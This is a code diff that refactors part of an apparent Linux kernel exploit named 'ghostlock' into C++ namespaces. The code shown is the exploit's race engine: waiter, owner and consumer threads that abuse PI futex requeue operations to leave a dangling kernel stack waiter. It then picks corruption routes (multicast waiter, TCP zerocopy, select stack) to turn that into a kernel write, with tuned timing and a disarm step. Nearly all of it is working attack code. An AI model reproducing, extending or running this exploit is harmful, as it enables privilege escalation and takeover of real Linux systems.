@@ -11,6 +11,8 @@
 #include "routes/route_controller.h"
 #include "session/exploit_session.hpp"
 
+namespace ghostlock::race {
+
 /* Decoupling plan: run the shared PI waiter and delegate route execution.
  * Input: currently implicit race/session state; output: completion/status.
  * CPP09: PiRace owns the lifecycle; this entry body and route dispatch move
@@ -18,14 +20,14 @@
 void *waiter_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
     const WriteRequest *request = race->request;
-    disable_rseq_for_thread();
+    ghostlock::support::disable_rseq_for_thread();
     int tid = (int) syscall(SYS_gettid);
     atomic_store(&race->waiter_tid, tid);
-    if (futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
+    if (ghostlock::support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
         pr_error("waiter lock chain errno=%d\n", errno);
     atomic_store(&race->waiter_ready, 1);
     while (!atomic_load(&race->owner_started))
-        usleep(execution_settings()->race_state_poll_interval_us);
+        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     struct timespec timeout;
     SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
     if (atomic_load(&race->fast_repair)) {
@@ -36,7 +38,7 @@ void *waiter_thread(void *arg) {
         }
     } else {
         uint64_t wait_ns =
-                (uint64_t) execution_settings()->race_route_wait_ms * 1000000ULL;
+                (uint64_t) ghostlock::ops::execution_settings()->race_route_wait_ms * 1000000ULL;
         timeout.tv_sec += (time_t)(wait_ns / 1000000000ULL);
         timeout.tv_nsec += (long) (wait_ns % 1000000000ULL);
         if (timeout.tv_nsec >= 1000000000L) {
@@ -45,20 +47,20 @@ void *waiter_thread(void *arg) {
         }
     }
     atomic_store(&race->waiter_waiting, 1);
-    futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
+    ghostlock::support::futex_op(&race->wait_futex, FUTEX_WAIT_REQUEUE_PI, 0, &timeout,
             &race->target_futex, 0);
-    RouteKind selected = kernel5_route_selected()
-            ? ROUTE_KIND_MULTICAST_WAITER
-            : (tcp_route_selected()
-                    ? ROUTE_KIND_TCP_ZEROCOPY
-                    : ROUTE_KIND_SELECT_STACK);
-    RouteController controller;
-    route_controller_init(&controller, race, &g_target_profile, selected);
-    race->route_status = route_controller_execute(&controller, request);
+    ghostlock::route::RouteKind selected = ghostlock::support::kernel5_route_selected()
+            ? ghostlock::route::ROUTE_KIND_MULTICAST_WAITER
+            : (ghostlock::support::tcp_route_selected()
+                    ? ghostlock::route::ROUTE_KIND_TCP_ZEROCOPY
+                    : ghostlock::route::ROUTE_KIND_SELECT_STACK);
+    ghostlock::route::RouteController controller;
+    ghostlock::route::route_controller_init(&controller, race, &g_target_profile, selected);
+    race->route_status = ghostlock::route::route_controller_execute(&controller, request);
     if (controller.fallback_used) {
         pr_warning("TCP route cleanly failed; used Select Stack fallback\n");
     }
-    if (selected == ROUTE_KIND_MULTICAST_WAITER) {
+    if (selected == ghostlock::route::ROUTE_KIND_MULTICAST_WAITER) {
         /* remove_waiter() left this thread's pi_blocked_on pointing at the
          * reclaimed stack waiter. Force one final slow-path removal while the
          * stack frame is still alive, matching the 5.x multicast primitive's
@@ -67,13 +69,13 @@ void *waiter_thread(void *arg) {
         uint32_t dummy_pi = 0x80000000U | (uint32_t) getpid();
         struct timespec expired = {.tv_sec = 0, .tv_nsec = 0};
         errno = 0;
-        long disarm = futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
+        long disarm = ghostlock::support::futex_op(&dummy_pi, FUTEX_LOCK_PI, 0, &expired, NULL, 0);
         pr_info("mcast ghost disarm ret=%ld errno=%d\n", disarm, errno);
     }
     atomic_store(&race->route_done, 1);
-    futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&race->chain_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     while (!atomic_load(&race->owner_chain_done))
-        usleep(execution_settings()->race_state_poll_interval_us);
+        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     return NULL;
 }
 
@@ -81,24 +83,24 @@ void *waiter_thread(void *arg) {
  * output: synchronization state; lifecycle owned by PiRace (CPP09). */
 void *owner_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
-    disable_rseq_for_thread();
-    long lock_target = futex_op(
+    ghostlock::support::disable_rseq_for_thread();
+    long lock_target = ghostlock::support::futex_op(
             &race->target_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
     if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
     while (!atomic_load(&race->waiter_ready) &&
             !atomic_load(&race->owner_stop))
-        usleep(execution_settings()->race_state_poll_interval_us);
+        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     if (atomic_load(&race->owner_stop)) {
         if (lock_target == 0)
-            futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+            ghostlock::support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
         return NULL;
     }
     atomic_store(&race->owner_started, 1);
-    futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
+    ghostlock::support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
     atomic_store(&race->owner_chain_done, 1);
     while (!atomic_load(&race->owner_stop)) sleep(1);
     if (lock_target == 0)
-        futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
+        ghostlock::support::futex_op(&race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
     return NULL;
 }
 
@@ -107,7 +109,7 @@ void *owner_thread(void *arg) {
  * lifecycle owned by PiRace (CPP09). */
 void *consumer_thread(void *arg) {
     auto *race = static_cast<PiRaceContext *>(arg);
-    disable_rseq_for_thread();
+    ghostlock::support::disable_rseq_for_thread();
     pin_to_core((size_t) race->consumer_cpu);
     pr_info("consumer thread running on cpu=%d\n", sched_getcpu());
     int seen = 0;
@@ -125,7 +127,7 @@ void *consumer_thread(void *arg) {
             int delay_usec = atomic_load(&race->route_delay_usec);
             if (delay_usec > 0) usleep((useconds_t) delay_usec);
             for (uint32_t burst = 0;
-                 burst < execution_settings()->select_consumer_burst_calls; burst++) {
+                 burst < ghostlock::ops::execution_settings()->select_consumer_burst_calls; burst++) {
                 if (atomic_load(&race->consumer_stop) ||
                         atomic_load(&race->consumer_go) != seq)
                     break;
@@ -137,13 +139,13 @@ void *consumer_thread(void *arg) {
                 int consumer_nice = target_profile_has_compact_waiter(&g_target_profile)
                         ? (calls_this_seq % 19) + 1
                         : PSELECT_CONSUMER_NICE;
-                long sched_ret = sched_setattr_tid(tid, consumer_nice);
+                long sched_ret = ghostlock::support::sched_setattr_tid(tid, consumer_nice);
                 if (sched_ret != 0) {
                     struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
-                    long fret = futex_op(
+                    long fret = ghostlock::support::futex_op(
                             &race->target_futex, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
                     if (fret == 0) {
-                        futex_op(
+                        ghostlock::support::futex_op(
                                 &race->target_futex, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
                         sched_ret = 0;
                     }
@@ -152,7 +154,7 @@ void *consumer_thread(void *arg) {
                 atomic_store(&race->consumer_inflight, 0);
                 calls_this_seq++;
                 if ((uint32_t) calls_this_seq >=
-                        execution_settings()->select_consumer_max_calls) {
+                        ghostlock::ops::execution_settings()->select_consumer_max_calls) {
                     atomic_store(&race->consumer_go, 0);
                     break;
                 }
@@ -167,23 +169,25 @@ void *consumer_thread(void *arg) {
 void reset_main_route_state(void) {
     int fast_repair = atomic_load(&ghostlock::g_exploit_session.race.fast_repair);
     ghostlock::g_exploit_session.race.reset(
-            fast_repair ? 5000 : (int) execution_settings()->select_enter_delay_us,
+            fast_repair ? 5000 : (int) ghostlock::ops::execution_settings()->select_enter_delay_us,
             runtime_config_snapshot().main_cpu, runtime_config_snapshot().consumer_cpu);
     atomic_store(&ghostlock::g_exploit_session.race.fast_repair, fast_repair);
 }
+
+}  // namespace ghostlock::race
 
 /* Wait for the parked waiter/owner pair, trigger the PI requeue and return the
  * route outcome once the waiter reported completion. The count/timeout policy
  * lives in outcome_with_counters() and TODO(pi-timeout-01). */
 RouteStatus ghostlock::PiRace::run() noexcept {
     while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
-        usleep(execution_settings()->race_state_poll_interval_us);
+        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     pr_info("[route] waiter parked; owner started\n");
     usleep(atomic_load(&fast_repair)
             ? 5000
-            : execution_settings()->race_setup_settle_us);
+            : ghostlock::ops::execution_settings()->race_setup_settle_us);
     errno = 0;
-    long rq = futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
+    long rq = ghostlock::support::futex_op(&wait_futex, FUTEX_CMP_REQUEUE_PI, 1, (void *) 1,
             &target_futex, 0);
     pr_info("[route] CMP_REQUEUE_PI ret=%ld errno=%d; waiting route_done\n",
             rq, errno);
@@ -193,7 +197,7 @@ RouteStatus ghostlock::PiRace::run() noexcept {
      * never disarmed. Bound the wait from TargetProfile.execution and map a
      * timeout to ROUTE_DIRTY_FAILURE instead of looping indefinitely. */
     while (!atomic_load(&route_done))
-        usleep(execution_settings()->race_state_poll_interval_us);
+        usleep(ghostlock::ops::execution_settings()->race_state_poll_interval_us);
     const RouteStatus status = route_status;
     const int calls = atomic_load(&consumer_calls);
     const int success = atomic_load(&consumer_success);
@@ -203,6 +207,8 @@ RouteStatus ghostlock::PiRace::run() noexcept {
             calls, success);
     return outcome_with_counters(status, calls, success);
 }
+
+namespace ghostlock::race {
 
 /* Create, synchronize, stop and join one explicitly owned PI race. */
 int run_main_route_threads(const WriteRequest *request) {
@@ -225,3 +231,5 @@ int run_main_route_threads(const WriteRequest *request) {
     pr_info("[route] threads joined\n");
     return status.code == ROUTE_OK;
 }
+
+}  // namespace ghostlock::race
